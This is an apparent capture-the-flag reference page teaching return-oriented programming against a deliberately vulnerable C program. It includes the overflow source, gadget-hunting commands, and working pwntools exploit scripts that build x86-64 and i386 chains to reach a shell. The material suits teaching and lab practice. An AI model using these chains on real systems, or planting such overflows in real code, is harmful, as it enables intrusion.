---
title: "ROP - Fundamentals, Gadget Classes and Chain Construction"
category: pwn
subcategory: rop
type: technique
tags: [rop, rop-chain, gadget, return-oriented-programming, nx, dep, pie, relro, canary, stack-pivot, syscall, write-what-where, cdecl, x86-64, i386, gets, strcpy, read, pwntools, checksec]
difficulty: medium
summary: "NX kills shellcode, so you chain existing code. Gadget classes, hand-built x86-64 and i386 chains, and the pwntools ROP() API."
when_to_use:
  - "checksec says NX enabled and you have a stack overflow with control of the saved return address"
  - "You need to call a function with arguments instead of just jumping to a win() symbol"
  - "You have limited overflow space and need a stack pivot into a bigger buffer"
  - "You want to set up registers for a syscall (execve, mprotect) from a non-writable stack"
  - "ret2win worked but the target function needs controlled arguments"
tools: [pwntools, ROPgadget, ropper, checksec, gdb, gef, pwndbg, objdump, one_gadget]
related: [stack-buffer-overflow-basics, stack-ret2win, rop-ret2libc, rop-ret2csu, rop-stack-pivot, rop-got-overwrite, rop-static-binary, rop-srop, mitigation-modern-playbook]
---

## TL;DR

NX/DEP makes the stack non-executable, so you cannot jump to shellcode you wrote there. Instead
you reuse short instruction sequences that already exist in the binary, each ending in `ret`, and
you drive them by filling the stack with their addresses. The stack becomes your instruction
pointer, and `ret` becomes your "next instruction" opcode. A chain of these gadgets can set up
registers, write memory, and ultimately call `execve("/bin/sh")` or `system("/bin/sh")`.

## Recognise it

- `checksec` prints `NX: NX enabled` and `Stack: No canary found` (or you already have a canary leak).
- A stack overflow where you control the saved return address and at least 3-4 more qwords after it.
- The binary is `No PIE` (addresses are fixed) or you already leaked the PIE base.
- The challenge gives you a `win(int a, int b)` style function that checks its arguments, so a
  plain ret2win is not enough.
- Static binary (`file` says `statically linked`) -- huge gadget supply, usually a syscall chain.
- `Partial RELRO` plus a write gadget means GOT overwrite is on the table.

Signals in the source: `gets()`, `strcpy()`, `scanf("%s")`, `read(0, buf, BIG)` where `BIG` exceeds
`sizeof(buf)`.

## Vulnerable source

```c
/* vuln.c - a deliberately trivial ROP target */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void secret(long a, long b) {
    if (a == 0xdeadbeef && b == 0xcafebabe)
        system("/bin/sh");
    else
        puts("wrong arguments");
}

void vuln(void) {
    char buf[64];
    puts("say something:");
    read(0, buf, 0x200);          /* 512 bytes into a 64 byte buffer */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

Build it so the only mitigation left is NX:

```sh
# x86-64, no canary, no PIE, NX on (the default) -> fixed gadget addresses
gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c

# the same source as a 32-bit binary, for the cdecl variant below
gcc -m32 -fno-stack-protector -no-pie -z noexecstack -o vuln32 vuln.c

# always confirm what you actually built
checksec --file=./vuln
```

## Theory

### Why NX forces ROP

Classic exploitation wrote shellcode into `buf` and returned to it. With `-z noexecstack` the
stack pages are mapped `rw-`, so the CPU faults on the first instruction fetch. The data you
control is not executable, and the code that is executable you did not write. ROP resolves this
by only ever *returning into* code that already exists and is already marked executable.

### The ret as a dispatcher

A `ret` is `pop rip`. If the stack holds `[g1, g2, g3, ...]` and execution reaches any `ret`,
the CPU jumps to `g1`. When `g1` itself ends in `ret`, the stack pointer has already advanced,
so the next `ret` fetches `g2`. The stack pointer is now effectively the program counter, and
your payload is a list of addresses instead of a list of opcodes.

Two consequences follow immediately:

1. Every gadget must end in a control-transfer you can predict: `ret`, or `jmp reg` / `call reg`
   if you also control that register.
2. Any `pop` inside a gadget consumes a qword from your payload. You must supply that value.
   A `pop rdi ; pop rsi ; ret` gadget needs two stack slots, not one.

### Gadget classes

| Class | Typical form | What it buys you |
|---|---|---|
| Register load | `pop rdi ; ret` | Set an argument register from the payload |
| Register move | `mov rdi, rax ; ret`, `xchg rax, rdi ; ret` | Move a leaked/returned value into an argument |
| Write-what-where | `mov qword [rdi], rsi ; ret`, `mov [rax], rdx ; ret` | Plant `/bin/sh` or a function pointer in `.bss` |
| Read-what-where | `mov rax, qword [rdi] ; ret` | Dereference a GOT entry, deref a pointer chain |
| Arithmetic | `add rax, rdx ; ret`, `sub eax, ebx ; ret`, `inc eax ; ret` | Build values you cannot pop (e.g. syscall numbers) |
| Syscall | `syscall ; ret`, `int 0x80`, `syscall` | The actual kernel entry after registers are staged |
| Stack pivot | `leave ; ret`, `xchg rsp, rax ; ret`, `add rsp, 0x38 ; ret`, `pop rsp ; ret` | Move `rsp` into a larger buffer you fully control |
| Alignment / padding | `ret` | Fix the 16-byte alignment `movaps` requires |
| Zeroing | `xor rax, rax ; ret`, `xor edx, edx ; ret` | Produce NULL for `envp`, `argv` or a constraint |

A "ret-only" gadget (a bare `ret`) is not filler. It is the standard fix for the `movaps` SIGSEGV
in modern glibc `system()`, and it is also how you eat one stack slot to realign a chain.

### Calling conventions

**x86-64 System V**: integer arguments go in `rdi, rsi, rdx, rcx, r8, r9`, then the stack.
The return value is in `rax`. So calling `f(a, b)` is:

```
[ pop rdi ; ret ][ a ][ pop rsi ; ret ][ b ][ addr of f ]
```

`rdx` is the awkward one. `pop rdx ; ret` is often absent from small non-PIE binaries; that is
exactly the problem `ret2csu` solves. See `rop-ret2csu`.

**i386 cdecl**: all arguments go on the stack, pushed right to left, and the *caller* cleans up.
Calling `f(a, b)` and then `g(c)` needs a gadget that removes the arguments between the calls:

```
[ addr of f ][ pop2_ret ][ a ][ b ][ addr of g ][ exit_or_ret ][ c ]
                ^ return address of f, a "pop ebx ; pop esi ; ret" style gadget
```

The slot immediately after a function address is that function's *return address*, and the
arguments follow it. If you only make one call, the return address can be garbage (or `exit`).
If you make two calls, that slot must be a `pop N ; ret` gadget that discards exactly the
argument count of the first call.

### Gadget constraint solving

You almost never get the gadget you want. You get a nearby one with side effects. The workflow is:

1. Write down the register state you need at the call site.
2. Search for the exact gadget. If absent, search for the *destination register* being written
   anywhere: `ROPgadget --binary ./vuln --only "mov|ret" | grep "rdx"`.
3. Accept a dirty gadget and compensate. `pop rdi ; pop rbp ; ret` is fine if you push a dummy
   for `rbp`. `mov rdx, rbx ; ret` is fine if you can reach `rbx` with a `pop`.
4. Watch for gadgets that clobber what you already set. Order the chain so that the most
   fragile register is set last.
5. If a gadget ends in `call rax` or `jmp rdx` instead of `ret`, you must control that register
   and the chain continues from there, not from the stack.

## Gadget shopping list

```sh
# every gadget, dumped to a file you can grep repeatedly
ROPgadget --binary ./vuln > gadgets.txt

# the bread and butter argument setters (x86-64)
grep -E "pop (rdi|rsi|rdx|rcx|r8|r9|rax) ; ret" gadgets.txt

# write-what-where
ROPgadget --binary ./vuln --only "mov|ret" | grep -E "mov .?\[r"

# syscall / int 0x80 primitives
ROPgadget --binary ./vuln --only "syscall|ret"
ropper --file ./vuln --search "int 0x80"

# stack pivots, sorted by how far they move rsp
ROPgadget --binary ./vuln | grep -E "leave ; ret|xchg .*rsp|add rsp"

# ready-made execve chain from a static binary
ROPgadget --binary ./vuln --ropchain

# find the string we want to pass to system/execve
ROPgadget --binary ./vuln --string "/bin/sh"
strings -a -t x ./vuln | grep "/bin/sh"
```

## Attack

1. `checksec ./vuln` -- confirm NX, note PIE/RELRO/canary.
2. Find the offset to the saved return address. Send a `cyclic(200)` pattern, read `rsp` (x86-64)
   or `eip` (i386) from the crash, and feed it to `cyclic_find`.
3. Decide the goal: call a local function with arguments, call `system` in libc, or stage a
   `syscall`. This file covers the first; see `rop-ret2libc` and `rop-static-binary` for the rest.
4. Collect the gadgets you need for those arguments.
5. Build the chain: `padding || gadget || value || gadget || value || target`.
6. Add a `ret` for alignment before any glibc call on x86-64.
7. Test locally with `gdb`, stepping each `ret` (`b *addr ; ni`) before firing at remote.

## Exploit

```python
#!/usr/bin/env python3
"""
ROP fundamentals - call secret(0xdeadbeef, 0xcafebabe) in a no-PIE x86-64 binary.

Local:   ./exploit.py
Remote:  ./exploit.py HOST PORT
Build:   gcc -fno-stack-protector -no-pie -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]


def start():
    """Local process by default, remote when argv gives host/port."""
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    if args.GDB:
        return gdb.debug(BINARY, gdbscript="b *vuln+40\nc\n")
    return process(BINARY)


def find_offset():
    """Crash the binary with a cyclic pattern and recover the saved-RIP offset."""
    with context.local(log_level="error"):
        p = process(BINARY)
        p.sendline(cyclic(200, n=8))
        p.wait()
        core = p.corefile
        p.close()
    return cyclic_find(core.read(core.rsp, 8), n=8)


def build_chain(offset):
    rop = ROP(elf)

    # rop.call() resolves the argument-setting gadgets for us
    rop.call(elf.symbols["secret"], [0xDEADBEEF, 0xCAFEBABE])

    log.info("chain layout:\n%s", rop.dump())
    return flat({offset: rop.chain()}, filler=b"A")


def main():
    offset = 72  # 64 byte buffer + 8 byte saved rbp; verify with find_offset()
    payload = build_chain(offset)

    io = start()
    io.recvuntil(b"say something:")
    io.sendline(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```

The same chain written by hand, with no `ROP()` helper, so you can see every slot:

```python
#!/usr/bin/env python3
"""Hand-built ROP chains: x86-64 System V and i386 cdecl, side by side."""
from pwn import *

context.arch = "amd64"


def chain_amd64(pop_rdi, pop_rsi_r15, secret, ret_pad):
    """secret(0xdeadbeef, 0xcafebabe) on x86-64."""
    chain = b""
    chain += p64(pop_rdi)          # gadget: pop rdi ; ret
    chain += p64(0xDEADBEEF)       # -> rdi (1st argument)
    chain += p64(pop_rsi_r15)      # gadget: pop rsi ; pop r15 ; ret
    chain += p64(0xCAFEBABE)       # -> rsi (2nd argument)
    chain += p64(0x0)              # -> r15, a dummy the gadget forces us to supply
    chain += p64(ret_pad)          # bare ret: 16-byte alignment for any movaps inside
    chain += p64(secret)           # finally call the target
    return chain


def chain_i386(secret, exit_addr, pop2_ret, puts_plt, msg):
    """cdecl: arguments live on the stack AFTER the return address.

    Layout for two consecutive calls:
        [puts][pop2_ret][msg]  ... pop2_ret eats 2 slots, we only pushed 1, so
    we use a pop1-style gadget in practice. Shown here with a 2-arg second call.
    """
    chain = b""
    chain += p32(puts_plt)         # call puts(msg)
    chain += p32(pop2_ret)         # puts returns here; this cleans the stack
    chain += p32(msg)              # puts argument 1
    chain += p32(0xDEADBEEF)       # filler consumed by the 2nd pop of pop2_ret
    chain += p32(secret)           # call secret(a, b)
    chain += p32(exit_addr)        # secret returns into exit()
    chain += p32(0xDEADBEEF)       # secret argument 1
    chain += p32(0xCAFEBABE)       # secret argument 2
    return chain


def main():
    # Addresses below are placeholders: replace with ROPgadget output for YOUR binary.
    amd64 = chain_amd64(
        pop_rdi=0x00401256,
        pop_rsi_r15=0x00401254,
        secret=0x004011A6,
        ret_pad=0x0040101A,
    )
    i386 = chain_i386(
        secret=0x08049196,
        exit_addr=0x08049040,
        pop2_ret=0x08049222,
        puts_plt=0x08049030,
        msg=0x0804A008,
    )
    log.info("amd64 chain: %d bytes", len(amd64))
    log.info("i386  chain: %d bytes", len(i386))
    print(hexdump(amd64))
    print(hexdump(i386))


if __name__ == "__main__":
    main()
```

## The pwntools ROP API

| Call | What it does |
|---|---|
| `ROP(elf)` / `ROP([elf, libc])` | Build a chain, searching one binary or several |
| `rop.call("puts", [elf.got["puts"]])` | Emit the argument gadgets and the call, automatically |
| `rop.raw(0x401016)` / `rop.raw(b"AAAAAAAA")` | Append a literal qword or raw bytes |
| `rop.migrate(0x404800)` | Emit a stack pivot to a new `rsp` |
| `rop.find_gadget(["pop rdi", "ret"])` | Gadget object; `.address` is the qword you want |
| `rop.ret.address` | A bare `ret`, for `movaps` alignment |
| `rop.chain()` | The assembled bytes, usually fed to `flat({offset: ...})` |
| `print(rop.dump())` | Annotated, indented view of every slot |

`rop.dump()` is the single most useful debugging call here. Print it before you send anything;
a chain that looks wrong in `dump()` is wrong on the wire. Attribute access also works:
`rop.puts(elf.got["puts"])` is shorthand for `rop.call("puts", [...])`.

## Variants & pitfalls

- **Off-by-one on the offset.** On x86-64 the saved RIP sits at `sizeof(buf) + 8` only when the
  compiler did not insert extra alignment padding. Always measure with `cyclic`, never assume.
- **Null bytes.** `read()` is binary safe; `gets()`, `scanf("%s")` and `strcpy()` are not.
  `strcpy` truncates at the first `\x00`, which kills most x86-64 addresses (they start with
  `\x00\x00`). Put the null-terminated address last, or switch primitives.
- **Newline stops.** `gets()` and `scanf("%s")` stop at `\n` / whitespace. `0x0a` inside a gadget
  address breaks the chain.
- **movaps SIGSEGV.** A crash inside `do_system` or `__memcpy_avx_unaligned` at a `movaps`
  instruction means `rsp` is not 16-byte aligned at the call. Insert one extra bare `ret`.
  See `rop-ret2libc`.
- **PIE.** With PIE, all gadget addresses are offsets. Leak one binary address first, then set
  `elf.address = leak - known_offset` and let pwntools rebase every symbol and gadget.
- **Full RELRO** blocks GOT overwrite, not ROP itself.
- **Short overflow.** If you only control 2-3 qwords past RIP, you cannot fit a chain. Pivot:
  read a long chain into `.bss` with `read()`, then `leave ; ret` into it. See `rop-stack-pivot`.
- **Gadgets in the middle of instructions.** On x86 you can jump into the *middle* of a longer
  instruction and decode something entirely different. ROPgadget finds these automatically;
  they are perfectly valid and often the only `pop rdx` you get.
- **i386 stack cleanup.** Forgetting the `pop N ; ret` between two cdecl calls makes the second
  call read your first call's arguments as its return address.
- **Static binaries** have thousands of gadgets; `ROPgadget --ropchain` frequently solves them
  outright. See `rop-static-binary`.
- **Partial writes.** When you cannot pop a value, build it: `pop rax` a base, then
  `add rax, rdx ; ret` repeatedly.

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` | Mitigation status. From pwntools or the `checksec` package |
| `ROPgadget --binary ./vuln` | Gadget dump, `--only`, `--string`, `--ropchain` |
| `ropper --file ./vuln --search "pop rdi"` | Gadget search with semantic filters, `--jmp`, `--stack-pivot` |
| `pwntools ROP()` | Programmatic chain building, `call`, `raw`, `chain`, `dump`, `migrate` |
| `gdb` + `gef` / `pwndbg` | `ropgadget`, `ropper`, `rop` commands built in; `vmmap` for pivot targets |
| `objdump -d --no-show-raw-insn ./vuln` | Manual gadget hunting and offset confirmation |
| `cyclic` / `cyclic_find` | Offset discovery |
| `one_gadget ./libc.so.6` | Once you are in libc; see `rop-one-gadget` |
